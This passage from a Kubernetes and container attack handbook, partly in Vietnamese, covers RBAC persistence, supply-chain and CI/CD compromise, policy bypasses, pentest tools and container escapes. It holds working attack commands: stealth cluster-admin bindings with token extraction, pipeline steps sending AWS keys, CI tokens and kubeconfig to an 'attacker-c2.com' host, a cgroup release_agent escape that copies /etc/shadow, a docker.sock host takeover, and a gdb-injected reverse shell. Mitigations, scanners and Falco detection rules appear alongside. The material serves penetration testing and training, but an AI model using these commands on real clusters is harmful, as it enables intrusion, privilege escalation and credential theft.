kubectl get pods --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace}{"\t"}{.metadata.name}{"\t"}{.spec.containers[*].image}{"\n"}{end}'

# Compare with known-good images
# Use image scanning to check for anomalies
```

### 49. RBAC Persistence

**Grant cluster-admin to your service account:**

```bash
# If you have permission to create ClusterRoleBinding
cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: persistent-admin
subjects:
- kind: ServiceAccount
  name: attacker-sa
  namespace: default
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
EOF
```

**Or create a new SA with cluster-admin and store the token:**
```bash
# Create new SA
kubectl create sa stealth-sa -n kube-system

# Bind cluster-admin
kubectl create clusterrolebinding stealth-admin \
  --clusterrole=cluster-admin \
  --serviceaccount=kube-system:stealth-sa

# Get token
SA_SECRET=$(kubectl get sa stealth-sa -n kube-system -o jsonpath='{.secrets[0].name}')
kubectl get secret $SA_SECRET -n kube-system -o jsonpath='{.data.token}' | base64 -d
# Store this token for future access
```

---

## H. SUPPLY CHAIN ATTACKS

### 50. Malicious Container Images

**Docker Hub — số liệu đáng sợ:**
- Hàng ngàn images chứa malware
- Crypto miners: 90% malicious images
- Backdoors: reverse shells, SSH keys
- Information stealers: env vars, config files

**Common malicious image behaviors:**
1. **Crypto mining** — Uses host CPU/GPU
2. **Data exfiltration** — Sends env, config, secrets to C2
3. **Backdoor access** — Reverse shell, SSH server
4. **DDoS botnet** — Participates in DDoS attacks
5. **Lateral movement** — Scans network, spreads
6. **Credential theft** — Steals cloud credentials

**Image analysis techniques:**
```bash
# Dive into image layers
dive <image>:<tag>

# Show ALL layers and their content
dive <image> --source=docker

# Extract image content
skopeo copy docker://<image> dir:/tmp/image-extract

# Analyze with Trivy
trivy image --severity CRITICAL,HIGH --ignore-unfixed <image>

# Check for secrets in image
trivy image --scanners secret <image>

# Check image history
docker history --no-trunc <image>
```

### 51. Dependency Poisoning

**Dockerfile attack vectors:**

**APT/YUM/APK repository poisoning:**
```dockerfile
# If attacker controls the package repo
RUN echo "deb http://attacker-repo/debian bullseye main" > /etc/apt/sources.list
RUN apt-get update && apt-get install -y nginx  # Installs from attacker repo!
```

**Pip/NPM/Gem dependency confusion:**
```dockerfile
# Dependency confusion: public package with same name as private
RUN pip install internal-tool  # Could pull malicious public package
RUN npm install @company/internal-lib  # Could pull malicious public package
```

**Go module poisoning:**
```dockerfile
# Go modules from public proxy
RUN go install github.com/attacker/malicious-module@latest
```

**Mitigation:**
```dockerfile
# Use checksums
RUN curl -fsSL https://example.com/tool.sh | sha256sum -c <checksum> && bash

# Use specific versions (not latest)
RUN pip install requests==2.28.1

# Use private mirrors/registries
RUN pip install --index-url https://private-pypi.company.com/ internal-tool

# Pin with hash (pip)
RUN pip install --require-hashes -r requirements.txt

# For npm, use package-lock.json
COPY package-lock.json ./
RUN npm ci
```

### 52. CI/CD Pipeline Compromise

**GitHub Actions:**
```yaml
# .github/workflows/build.yml — malicious workflow
name: Build and Deploy
on:
  push:
    branches: [main]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v3
    - name: Build
      run: |
        docker build -t app:latest .
        # 🚨 Exfiltrate secrets
        curl -X POST -d "${{ secrets.AWS_ACCESS_KEY_ID }}:${{ secrets.AWS_SECRET_ACCESS_KEY }}" https://attacker-c2.com/exfil
    - name: Push
      run: |
        docker push app:latest
```

**GitLab CI:**
```yaml
# .gitlab-ci.yml
variables:
  DOCKER_IMAGE: $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA

build:
  script:
    - docker build -t $DOCKER_IMAGE .
    - docker push $DOCKER_IMAGE
    - # 🚨 Exfil
    - curl -X POST -d "$CI_JOB_TOKEN" https://attacker-c2.com/gitlab-token
```

**Jenkins Pipeline:**
```groovy
pipeline {
    agent any
    stages {
        stage('Build') {
            steps {
                sh '''
                    docker build -t app:latest .
                    # 🚨 Steal K8s credentials
                    cat ~/.kube/config | curl -X POST --data-binary @- https://attacker-c2.com/kubeconfig
                '''
            }
        }
    }
}
```

**CI/CD attack surface:**
1. **Secrets in CI/CD variables** — Often have cloud/K8s credentials
2. **CI/CD runner** — If compromise runner, all builds affected
3. **PR-based attacks** — Fork + PR with malicious workflow changes
4. **Dependency confusion in CI tools** — Malicious Actions/Marketplace plugins
5. **Cache poisoning** — CI build cache

### 53. Helm Chart Vulnerabilities

Helm = Kubernetes package manager. Charts = templates + values.

**Common Helm vulnerabilities:**
1. **Hardcoded secrets in values.yaml:**
   ```yaml
   # values.yaml — DO NOT COMMIT SECRETS
   db:
     password: "SuperSecret123!"  # 🚨
   ```

2. **Templates with variable injection:**
   ```yaml
   # templates/deployment.yaml
   env:
   - name: DB_PASS
     value: {{ .Values.db.password }}
   ```

3. **HostPath volumes:**
   ```yaml
   # templates/deployment.yaml
   volumes:
   - hostPath:
       path: {{ .Values.hostPath }}  # Could be /
   ```

4. **Privileged containers:**
   ```yaml
   # templates/deployment.yaml
   securityContext:
     privileged: {{ .Values.privileged }}
   ```

5. **Default passwords:**
   ```yaml
   # Some charts deploy with default admin:password
   ```

**Helm security check:**
```bash
# Check for common issues
helm lint ./chart/

# Dry-run to see generated manifests
helm template ./chart/ --debug

# Check values
helm show values ./chart/

# Scan with Trivy
trivy config ./chart/

# Checkov for Helm
checkov -d ./chart/ --framework helm
```

### 54. OPA/Gatekeeper Policy Evasion

**Gatekeeper policies are powerful but can be bypassed:**

**Bypass 1 — Not all resource types covered:**
```yaml
# If policy only checks Pods, use Deployment
# If policy only checks Deployments, use StatefulSet or DaemonSet
```

**Bypass 2 — Label mismatch:**
```yaml
# If policy targets specific namespaces, use different namespace
# If policy checks for "app" label, use different label scheme
```

**Bypass 3 — Policy failure mode:**
```yaml
# If failurePolicy: Ignore, webhook failure allows pod creation
# Overload webhook: send many requests simultaneously
```

**Bypass 4 — Use subresources:**
```yaml
# Some policies only check top-level resources
# Use kubectl scale, exec, port-forward which are subresources
```

**Bypass 5 — Mutation bypass:**
```yaml
# Gatekeeper has "validation.gatekeeper.sh" label checking
# If mutation webhook runs before validation, can bypass
```

**Bypass 6 — Deprecated API versions:**
```yaml
# Use old API version not covered by policy
apiVersion: extensions/v1beta1  # Old, maybe not checked
kind: Deployment
```

### 55. Kyverno Policy Bypass

**Kyverno bypass techniques:**

1. **Policy only applies to CREATE, not UPDATE:**
   ```bash
   kubectl create deployment app --image=nginx
   kubectl edit deployment app  # Changes not re-checked!
   ```

2. **Use replace instead of create:**
   ```bash
   # If policy blocks pods with privileged containers on create
   # Export, modify, delete, re-create via replace
   kubectl get pod -o yaml > pod.yaml
   # Modify
   kubectl delete pod <name>
   kubectl replace -f pod.yaml
   ```

3. **Namespace exclusion:**
   ```yaml
   # If policy has namespaceSelector with specific labels
   # Create namespace without those labels
   ```

4. **Autogen policies:**
   ```yaml
   # Kyverno autogen applies policy to all workload types
   # But custom resources may not be covered
   ```

---

## I. TOOL MASTERY

### 56. kubectl — The Swiss Army Knife

**Essential command categories:**

```bash
# === INFORMATION GATHERING ===
kubectl cluster-info
kubectl cluster-info dump    # Full cluster dump (large!)

# === RESOURCE MANAGEMENT ===
kubectl get all --all-namespaces        # All resources
kubectl api-resources                    # All API resources
kubectl api-versions                     # All API versions
kubectl explain pod.spec.securityContext # Documentation

# === DEBUGGING ===
kubectl describe pod <pod>
kubectl logs <pod> [-c <container>]
kubectl logs --previous <pod>            # Restart logs
kubectl exec -it <pod> -- /bin/sh
kubectl port-forward <pod> 8080:80
kubectl cp <pod>:/path /local/path

# === RBAC ===
kubectl auth can-i <verb> <resource>
kubectl auth can-i list secrets --as system:admin  # As another user
kubectl create clusterrolebinding <name> --clusterrole=cluster-admin --serviceaccount=<ns>:<sa>

# === SECURITY ===
kubectl get podsecuritypolicies  # If still using PSP
kubectl get validatingwebhookconfigurations
kubectl get mutatingwebhookconfigurations
kubectl get networkpolicies --all-namespaces

# === ADVANCED ===
kubectl get events -A --sort-by='.lastTimestamp'
kubectl get pods -o wide --all-namespaces
kubectl get all -o json | jq '.items[].metadata.namespace' | sort -u
kubectl top pod --all-namespaces     # Resource usage
kubectl top node                     # Node resource usage
kubectl taint nodes --all             # Show taints
kubectl cordon <node>                 # Mark unschedulable
kubectl drain <node>                  # Evict pods
```

**kubectl config tricks:**
```bash
# View current context
kubectl config current-context

# Switch between clusters
kubectl config get-contexts
kubectl config use-context <name>

# Set default namespace
kubectl config set-context --current --namespace=kube-system

# Merge kubeconfigs
KUBECONFIG=~/.kube/config:~/.kube/other-config kubectl config view --flatten > merged-config

# Export/import
kubectl config view --raw > /tmp/exported-kubeconfig
```

### 57. k9s — Terminal UI Power User

```bash
# Run
k9s

# Custom view (filter by label)
k9s -n kube-system -l app=calico
```

**k9s hotkeys:**
| Key | Action |
|-----|--------|
| `:pod` | Show pods |
| `:deploy` | Show deployments |
| `:svc` | Show services |
| `:sec` | Show secrets (if allowed) |
| `:sa` | Show service accounts |
| `:rb` | Show rolebindings |
| `:crb` | Show clusterrolebindings |
| `:ns` | Show namespaces |
| `:events` | Show events |
| `d`| Describe |
| `y`| YAML |
| `l`| Logs |
| `s`| Shell |
| `e`| Edit |
| `ctrl-d`| Delete |
| `ctrl-k`| Kill |
| `?`| Help |

**k9s plugins (custom commands):**
```yaml
# ~/.config/k9s/plugins.yaml
plugins:
  scan-trivy:
    shortCut: Ctrl-t
    description: "Trivy scan image"
    scopes:
    - containers
    command: bash
    background: true
    args:
    - -c
    - "trivy image {{ .imageName }} | tee /tmp/trivy-scan.txt"
```

### 58. kube-bench — CIS Benchmarking

**CIS Kubernetes Benchmark checker:**

```bash
# Install
kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml

# Or run locally
kube-bench

# Run specific checks
kube-bench --check="1.1.1,1.2.1"

# Run with config
kube-bench --config-dir=/etc/kube-bench/cfg

# JSON output
kube-bench --json > /tmp/kube-bench-results.json

# Check specific sections
kube-bench --check="1"  # Control plane
kube-bench --check="2"  # etcd
kube-bench --check="3"  # Control plane configs
kube-bench --check="4"  # Worker nodes
kube-bench --check="5"  # Kubernetes policies
```

**Key CIS checks:**
- 1.1.1 — API server --anonymous-auth=false
- 1.1.2 — API server --basic-auth-file removed
- 1.1.3 — API server --token-auth-file removed
- 1.2.2 — Controller manager --use-service-account-credentials=true
- 2.1 — etcd peer/client cert auth
- 4.1.1 — Kubelet anonymous auth disabled
- 4.2.1 — Kubelet --read-only-port=0
- 5.1.1 — RBAC enabled
- 5.4.1 — Default service accounts not used

### 59. kube-hunter — Automated Pentesting

```bash
# Install
pip3 install kube-hunter

# Hunt a cluster
kube-hunter --kubeconfig ~/.kube/config

# Hunt an IP range
kube-hunter --cidr 10.0.0.0/8

# External scanning
kube-hunter --remote "https://api.example.com:6443"

# Running inside cluster (pod mode)
kubectl run kube-hunter \
  --rm \
  -it \
  --image=aquasec/kube-hunter \
  -- --pod

# Output JSON report
kube-hunter --cidr 192.168.1.0/24 --report json > kube-hunter-report.json

# Output to file
kube-hunter --cidr 192.168.1.0/24 --log-file hunts.log --active
```

**Vulnerability categories:**
- **CVE-2019-11246** — kubectl cp path traversal
- **CVE-2019-11253** — API server JSON/YAML DoS
- **CVE-2020-8554** — Man-in-the-middle via ExternalIP services
- **CVE-2020-8555** — SSRF in kube-controller-manager
- **CVE-2020-8559** — Privilege escalation via patch
- **CVE-2020-13597** — Webhook bypass
- **CVE-2021-25741** — Symlink exchange hostPath

### 60. Peirates — The K8s Attack Framework

**Peirates is specifically designed for penetration testing K8s clusters.**

```bash
# Download and run
wget https://github.com/inguardians/peirates/releases/latest/download/peirates
chmod +x peirates
./peirates

# Main menu options:
# 1. Get Service Account Info
# 2. Get Pod Information
# 3. Steal Secrets
# 4. Access kubelet API
# 5. Try to exfiltrate etcd
# 6. AWS IAM credential theft
# 7. GCP credential theft
# 8. Launch pod with hostPath

# Non-interactive
./peirates -get-service-account-info -namespace default
./peirates -steal-secrets -namespace kube-system
./peirates -kubelet-scan 192.168.1.0/24
./peirates -launch-pod -service-account <sa-name> -namespace <ns>
```

### 61. Popeye — Cluster Health

**Popeye evaluates cluster configuration, detects misconfigurations:**

```bash
# Install
kubectl krew install popeye
# Or standalone
popeye

# Run
popeye --context=my-cluster

# Interactive mode
popeye -f

# Check specific namespace
popeye --namespace default

# Save report
popeye --save --out html

# Override scores
popeye --scores popeye-score.yaml

# Check security-specific issues
popeye --focus security
```

**Popeye checks:**
- Container resource limits
- Pod disruption budgets
- Network policies
- RBAC best practices
- Node conditions
- Namespace coverage
- Service accounts
- Container images from trusted registries

### 62. Trivy — Image Scanning

**Trivy usage deep-dive:**

```bash
# Basic scan
trivy image nginx:latest

# Scan with severity
trivy image --severity CRITICAL,HIGH nginx:latest

# Ignore unfixed
trivy image --ignore-unfixed nginx:latest

# All output formats
trivy image --format json nginx:latest
trivy image --format sarif nginx:latest
trivy image --format template --template "@custom.tpl" nginx:latest

# Scan filesystem
trivy fs /path/to/project

# Scan repository
trivy repo https://github.com/org/repo.git

# Scan IaC (K8s, Terraform)
trivy config ./k8s-manifests/

# Scan SBOM
trivy sbom /path/to/sbom.spdx.json

# Vulnerability types
trivy image --vuln-type os,library nginx:latest

# Cache
trivy image --clear-cache nginx:latest
trivy image --cache-dir /tmp/trivy-cache nginx:latest

# Server mode
trivy server --listen 0.0.0.0:4954

# Client mode
trivy client --remote http://localhost:4954 nginx:latest

# Scan with ignore file
trivy image --ignorefile .trivyignore nginx:latest
```

**Trivy vulnerability DB:**
- OS packages (Alpine, Debian, Ubuntu, CentOS, RHEL, etc.)
- Programming languages: npm, pip, gem, cargo, nuget, maven, go, etc.
- IaC misconfigurations (K8s, Terraform, CloudFormation, Dockerfile)
- Secrets detection

### 63. Falco — Runtime Security

**Falco deployment deep-dive:**

```bash
# Install with Helm
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm install falco falcosecurity/falco \
  --namespace falco \
  --create-namespace \
  --set falco.driver.kind=ebpf \
  --set falco.driver.ebpf.resources.requests.cpu=100m \
  --set falco.driver.ebpf.resources.requests.memory=256Mi \
  --set falco.modernEbpf=true

# Custom rules
# Add custom rules file
# /etc/falco/rules.d/custom.yaml

# Falco rules structure
- rule: Detect kubeconfig theft
  desc: Detect reading of kubeconfig files
  condition: >
    open_read and container
    and fd.name startswith /root/.kube/config
    or fd.name startswith /home/
    and (fd.name endswith .kube/config or fd.name endswith kubeconfig)
  output: "Kubeconfig file accessed (user=%user.name container=%container.id file=%fd.name)"
  priority: WARNING
  tags: [container, filesystem, credential_access]

- rule: Detect privilege escalation
  desc: Container attempting to gain privileges
  condition: >
    (setuid or setgid) and container
    and not proc.name in (falco_priv_whitelist)
  output: "Attempt to set privileges (user=%user.name container=%container.id proc=%proc.name)"
  priority: CRITICAL
  tags: [container, privilege_escalation]
```

**Falco alerts integration:**
```yaml
# falco.yaml
json_output: true
json_include_output_property: true
http_output:
  enabled: true
  url: http://alertmanager:9093/api/v1/alerts
program_output:
  enabled: true
  keep_alive: false
  program: "jq '{text: .output}' | curl -d @- -X POST https://slack-webhook-url"
```

### 64. kubeletctl — Kubelet API Mastery

```bash
# Download
wget https://github.com/cyberark/kubeletctl/releases/latest/download/kubeletctl_linux_amd64
chmod +x kubeletctl
mv kubeletctl /usr/local/bin/

# Scan for kubelets
kubeletctl scan --cidr 10.0.0.0/8
kubeletctl scan --cidr 192.168.0.0/16

# Check specific node
kubeletctl -i 10.0.0.1 pods
kubeletctl -i 10.0.0.1 nodes

# Get metrics
kubeletctl -i 10.0.0.1 metrics

# Exec command
kubeletctl -i 10.0.0.1 exec "id" -p nginx-xxxxx -c nginx

# Port forwarding
kubeletctl -i 10.0.0.1 port-forward nginx-xxxxx 8080:80 -c nginx

# Get pod logs
kubeletctl -i 10.0.0.1 logs "nginx-xxxxx" -c nginx

# Run as specific user
kubeletctl -i 10.0.0.1 exec "id" -p nginx-xxxxx -c nginx --user 1000

# Check anonymous access
kubeletctl -i 10.0.0.1 pods --anonymous

# Bearer token auth
kubeletctl -i 10.0.0.1 pods --token $(cat /tmp/token)

# Client cert auth
kubeletctl -i 10.0.0.1 pods --cert kubelet-client.crt --key kubelet-client.key
```

### 65. Kubescape — Compliance & Security

**Kubescape scans K8s clusters for security issues, misconfigurations, and compliance.**

```bash
# Install
curl -s https://raw.githubusercontent.com/armosec/kubescape/master/install.sh | /bin/bash

# Quick scan
kubescape scan

# Specific framework
kubescape scan framework nsa    # NSA hardening guide
kubescape scan framework mitre  # MITRE ATT&CK
kubescape scan framework cis    # CIS benchmark

# Scan specific controls
kubescape scan control C-0009  # HostPath mount
kubescape scan control C-0017  # Privileged container
kubescape scan control C-0057  # Secrets not encrypted

# Output formats
kubescape scan --format json
kubescape scan --format pdf
kubescape scan --format html
kubescape scan --format sarif

# Submit to Kubescape SaaS
kubescape scan --submit

# Scan specific namespaces
kubescape scan --include-namespaces default,kube-system

# Exclude frameworks
kubescape scan --exclude-frameworks "NSA"

# Remediation suggestions
kubescape scan --verbose
```

### 66. KubeAudit — Audit Events

**KubeAudit analyzes Kubernetes audit events:**

```bash
# Install
go install github.com/Shopify/kubeaudit@latest

# Run
kubeaudit all -n default

# Check for privileged containers
kubeaudit privesc -n default

# Check for non-root containers
kubeaudit nonroot -n default

# Check for host network
kubeaudit hostnetwork -n default

# Check for capabilities
kubeaudit capabilities -n default

# Output JSON
kubeaudit all -n default --format json

# Fix auto (apply remediation where possible)
kubeaudit all -n default --fix

# Audit audit logs
kubeaudit audit --file /var/log/kubernetes/audit.log
```

### 67. KubePwn

**KubePwn is a CTF-focused K8s exploitation framework.**

```bash
# Clone
git clone https://github.com/0x4D31/kubepwn
cd kubepwn
pip install -r requirements.txt

# Check current access
python kubepwn.py check

# Enumerate
python kubepwn.py enum

# Escalate
python kubepwn.py escalate

# Dump secrets
python kubepwn.py dump-secrets
```

---

## J. CONTAINER ESCAPE CHECKLIST

Checklist chi tiết từng bước kiểm tra khả năng escape khỏi container.

### 68. Initial Recon Inside Container

```bash
#!/bin/bash
# escape-check.sh — Kiểm tra toàn diện khả năng escape

echo "=== CONTAINER ESCAPE CHECKLIST ==="
echo ""

# === CHECK 1: CAPABILITIES ===
echo "[1] CAPABILITIES"
capsh --print 2>/dev/null || echo "  capsh not available"
cat /proc/1/status | grep CapEff 2>/dev/null
echo "  Decode: $(cat /proc/1/status | grep CapEff | awk '{print $2}' 2>/dev/null | capsh --decode=- 2>/dev/null || echo 'decode capsh failed')"
echo ""

# === CHECK 2: SECCOMP ===
echo "[2] SECCOMP STATUS"
cat /proc/1/status | grep Seccomp 2>/dev/null
# 0 = disabled, 2 = filter (default)
echo ""

# === CHECK 3: APPARMOR ===
echo "[3] APPARMOR/SELINUX"
cat /proc/1/attr/current 2>/dev/null
echo ""

# === CHECK 4: PRIVILEGED MODE ===
echo "[4] PRIVILEGED CHECK"
# Check if can see host devices
if [ -b /dev/sda1 ]; then echo "  [!] Can see block devices (/dev/sda1 exists)"; fi
if [ -b /dev/nvme0n1 ]; then echo "  [!] Can see nvme devices"; fi
# Check full capability set
Caps=$(cat /proc/1/status | grep CapEff | awk '{print $2}')
if [ "$Caps" = "0000003fffffffff" ] || [ "$Caps" = "0000003fffffffff" ]; then
  echo "  [!] ALL capabilities present (likely privileged!)"
fi
echo ""

# === CHECK 5: MOUNTED PATHS ===
echo "[5] CRITICAL MOUNTS"
mount | grep -E "/var/run/docker.sock|/host|/proc/1/root"
echo ""

# === CHECK 6: DOCKER SOCKET ===
echo "[6] DOCKER SOCKET"
if [ -S /var/run/docker.sock ]; then
  echo "  [!] DOCKER SOCKET FOUND! Can escape!"
  ls -la /var/run/docker.sock
fi
# Search for docker socket
find / -name docker.sock 2>/dev/null
echo ""

# === CHECK 7: HOST PATH MOUNTS ===
echo "[7] HOST PATH MOUNTS"
mount | grep -v "^cgroup\|^proc\|^sysfs\|^devpts\|^tmpfs\|^overlay"
echo ""

# === CHECK 8: PROCESS LISTING (hostPID) ===
echo "[8] HOST PROCESS VISIBILITY"
if [ "$(ps aux 2>/dev/null | wc -l)" -gt 50 ]; then
  echo "  [!] Many processes visible (likely --pid=host)"
fi
echo ""

# === CHECK 9: NETWORK MODE ===
echo "[9] NETWORK MODE"
ip addr 2>/dev/null | grep -E "^[0-9]: " | grep -v "eth0\|lo" && echo "  [!] Multiple interfaces (likely --network=host)"
echo ""

# === CHECK 10: CGROUP V1 ESCAPE ===
echo "[10] CGROUP ESCAPE (v1)"
if [ -d /sys/fs/cgroup ]; then
  for cg in /sys/fs/cgroup/*; do
    if [ -f "$cg/release_agent" ] && [ -w "$cg" ]; then
      echo "  [!] Writable cgroup with release_agent in $cg — can escape!"
    fi
  done
fi
echo ""

# === CHECK 11: CGROUP V2 ESCAPE ===
echo "[11] CGROUP ESCAPE (v2)"
if [ -f /sys/fs/cgroup/cgroup.controllers ]; then
  echo "  cgroup v2 detected"
  cat /sys/fs/cgroup/cgroup.controllers 2>/dev/null
fi
echo ""

# === CHECK 12: /proc/1/root ACCESS ===
echo "[12] /proc/1/root ACCESS"
if [ -r /proc/1/root/etc/passwd ]; then
  echo "  [!] Can read /proc/1/root - potential escape"
fi
echo ""

# === CHECK 13: USER NAMESPACE ===
echo "[13] USER NAMESPACE"
if [ -f /proc/self/uid_map ]; then
  echo "  UID map: $(cat /proc/self/uid_map 2>/dev/null)"
  echo "  GID map: $(cat /proc/self/gid_map 2>/dev/null)"
fi
echo ""

# === CHECK 14: KUBERNETES SERVICE ACCOUNT ===
echo "[14] KUBERNETES SA TOKEN"
if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
  echo "  SA token exists"
  echo "  Namespace: $(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)"
fi
echo ""

# === CHECK 15: WRITABLE FILESYSTEM ===
echo "[15] WRITABLE FILESYSTEM"
touch /tmp/test-write 2>/dev/null && echo "  /tmp is writable" && rm /tmp/test-write
touch /test-write 2>/dev/null && echo "  / is writable (container without read-only rootfs)" && rm /test-write 2>/dev/null
echo ""

# === CHECK 16: KERNEL MODULES ===
echo "[16] KERNEL MODULE LOADING"
if command -v insmod &>/dev/null; then
  echo "  insmod available"
fi
if [ -f /proc/modules ]; then
  echo "  Can read loaded modules"
fi
echo ""

# === CHECK 17: SYS_ADMIN CAP CHECK ===
echo "[17] SYS_ADMIN ESCAPE TEST"
if capsh --print 2>/dev/null | grep -q sys_admin; then
  echo "  [!] Has SYS_ADMIN - can mount cgroups, access devices"
  # Quick test: try to mount cgroup
  mkdir -p /tmp/cgrp-test
  mount -t cgroup -o memory cgroup /tmp/cgrp-test 2>/dev/null && echo "  [!] Can mount cgroup — escape via release_agent!" && umount /tmp/cgrp-test 2>/dev/null
  rmdir /tmp/cgrp-test 2>/dev/null
fi
echo ""

echo "=== ESCAPE CHECKLIST COMPLETE ==="
```

### 69. Capabilities Quick Reference

| Capability | Flag Value | Risk | Escape Vector |
|-----------|-----------|------|---------------|
| **SYS_ADMIN** | 21 | 🔴 CRITICAL | Mount cgroups, access devices, namespace ops |
| **SYS_PTRACE** | 19 | 🔴 HIGH | ptrace host processes, memory dump |
| **SYS_RAWIO** | 17 | 🔴 HIGH | Read/write raw devices, memory |
| **SYS_MODULE** | 16 | 🔴 HIGH | Load kernel modules |
| **SYS_BOOT** | 22 | 🟡 MEDIUM | Reboot host |
| **NET_ADMIN** | 12 | 🟡 MEDIUM | iptables, network manipulation |
| **NET_RAW** | 13 | 🟡 MEDIUM | Raw sockets, packet crafting |
| **SYS_TIME** | 25 | 🟡 MEDIUM | Modify system clock |
| **SYSLOG** | 34 | 🟡 MEDIUM | Read kernel ring buffer |
| **DAC_OVERRIDE** | 1 | 🟡 MEDIUM | Bypass file permission checks |
| **DAC_READ_SEARCH** | 2 | 🟡 MEDIUM | Bypass file read checks |
| **LINUX_IMMUTABLE** | 9 | 🟡 MEDIUM | Set/remove immutable flags |
| **IPC_LOCK** | 14 | 🟡 LOW | Lock memory (avoid swapping) |
| **IPC_OWNER** | 15 | 🟡 LOW | Bypass IPC permission checks |
| **SYS_CHROOT** | 18 | 🟢 LOW | chroot (limited impact alone) |
| **SYS_NICE** | 23 | 🟢 LOW | Change process priority |
| **AUDIT_WRITE** | 29 | 🟢 LOW | Write audit log |
| **KILL** | 5 | 🟢 LOW | Send signals |
| **SETUID/SETGID** | 6/7 | 🟢 LOW | Set process UID/GID |
| **CHOWN** | 0 | 🟢 LOW | Change file ownership |
| **NET_BIND_SERVICE** | 10 | 🟢 LOW | Bind to privileged ports |
| **NET_BROADCAST** | 11 | 🟢 LOW | Socket broadcasting |

**Check CapEff value:**
```bash
# Full capabilities mask (privileged)
echo "obase=16; ibase=2; $(printf '%040d' $(echo 'obase=2; 2^41-1' | bc))" | bc
# → 1FFFFFFFFFF (but CapEff shows 0000003FFFFFFFFF in /proc/status)
```

### 70. Quick Escape Commands by Scenario

**Scenario 1: Docker socket mounted**
```bash
# If /var/run/docker.sock is accessible
# Method A: docker CLI
docker run -v /:/host -it alpine chroot /host bash

# Method B: curl API
curl -s --unix-socket /var/run/docker.sock \
  -X POST -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["chroot","/host","bash"],"Binds":["/:/host"],"Privileged":true}' \
  http://localhost/containers/create

# Method C: Python
python3 -c "import docker; client=docker.DockerClient(base_url='unix:///var/run/docker.sock'); client.containers.run('alpine', 'chroot /host bash', volumes={'/':{'bind':'/host','mode':'rw'}}, privileged=True, remove=True)"
```

**Scenario 2: Privileged container**
```bash
# Mount host root
mkdir /hostroot
mount /dev/sda1 /hostroot 2>/dev/null || mount /dev/nvme0n1p1 /hostroot 2>/dev/null
chroot /hostroot bash

# Or cgroup escape
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/tmp/escape.sh" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /tmp/escape.sh
echo 'cat /etc/shadow > '"$host_path"'/tmp/root.shadow' >> /tmp/escape.sh
chmod +x /tmp/escape.sh
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

**Scenario 3: SYS_ADMIN capability**
```bash
# Mount cgroup and escape
mkdir -p /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp 2>/dev/null || \
mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null || \
mount -t cgroup -o systemd cgroup /tmp/cgrp 2>/dev/null || \
mount -t cgroup -o devices cgroup /tmp/cgrp 2>/dev/null
```

**Scenario 4: Privileged + hostPID + CAP_SYS_PTRACE**
```bash
# Inject into host process
gdb -p $(pgrep -u root | head -1)
# In GDB:
# call (void)system("bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'")
```

**Scenario 5: /proc/1/root accessible**
```bash
# Bind mount proc to access host processes
mkdir /tmp/proc
mount --bind /proc/1/root /tmp/proc
# Now /tmp/proc is host root, but limited
```

---

## K. TOP RESOURCES

### 71. Books

| Title | Author | Focus |
|-------|--------|-------|
| **Container Security** | Liz Rice (O'Reilly) | Container fundamentals, isolation, runtime security |
| **Kubernetes Security** | Shannon & O'Reilly Team | Comprehensive K8s security |
| **Hacking Kubernetes** | Andrew Martin, Michael Hausenblas | Offensive K8s, threat-driven defense |
| **Kubernetes: Up and Running** | Brendan Burns et al. | K8s fundamentals (chapters on security) |
| **The Kubernetes Book** | Nigel Poulton | Accessible K8s intro |
| **Cloud Native Security** | Chris Binnie, Rory McCune | Cloud-native architecture security |
| **Hands-On Security in DevOps** | Tony Hsu | DevSecOps pipeline security |
| **Practical Cloud Security** | Chris Dotson | Multi-cloud security practices |

### 72. Certifications

| Certification | Provider | Notes |
|---------------|----------|-------|
| **CKS (Certified Kubernetes Security Specialist)** | CNCF/Linux Foundation | Hands-on, performance-based exam |
| **CKA (Certified Kubernetes Administrator)** | CNCF/Linux Foundation | Prerequisite for CKS |
| **Security+ / CySA+** | CompTIA | General security, not K8s-specific |
| **CEH (Certified Ethical Hacker)** | EC-Council | General pentesting |
| **OSCP** | Offensive Security | Pentesting (not K8s-specific but relevant) |
| **AWS Security Specialty** | AWS | Cloud security |
| **Azure Security Engineer** | Microsoft | Cloud security |

### 73. Official Documentation

- **Kubernetes Security Docs:** https://kubernetes.io/docs/concepts/security/
- **Kubernetes Hardening Guide (NSA/CISA):** https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF
- **OWASP Kubernetes Top 10:** https://owasp.org/www-project-kubernetes-top-ten/
- **CIS Kubernetes Benchmark:** https://www.cisecurity.org/benchmark/kubernetes
- **MITRE ATT&CK for Containers:** https://attack.mitre.org/matrices/enterprise/containers/
- **Docker Security:** https://docs.docker.com/engine/security/
- **Falco Documentation:** https://falco.org/docs/
- **Trivy Documentation:** https://aquasecurity.github.io/trivy/

### 74. Blogs & Articles

- **Aqua Security Blog:** https://blog.aquasec.com/ — K8s security, container threats, runtime security
- **Control Plane (Arkose Labs):** https://control-plane.io/ — K8s security research
- **Sysdig Blog:** https://sysdig.com/blog/ — Container security, Falco, runtime
- **Dynatrace Security:** https://www.dynatrace.com/news/category/security/
- **Google Cloud Security:** https://cloud.google.com/blog/products/identity-security
- **Microsoft Azure Security:** https://azure.microsoft.com/en-us/blog/topics/security/
- **Palo Alto Prisma Cloud:** https://www.paloaltonetworks.com/prisma/cloud
- **PortSwigger Research:** https://portswigger.net/research — Web security (K8s API related)
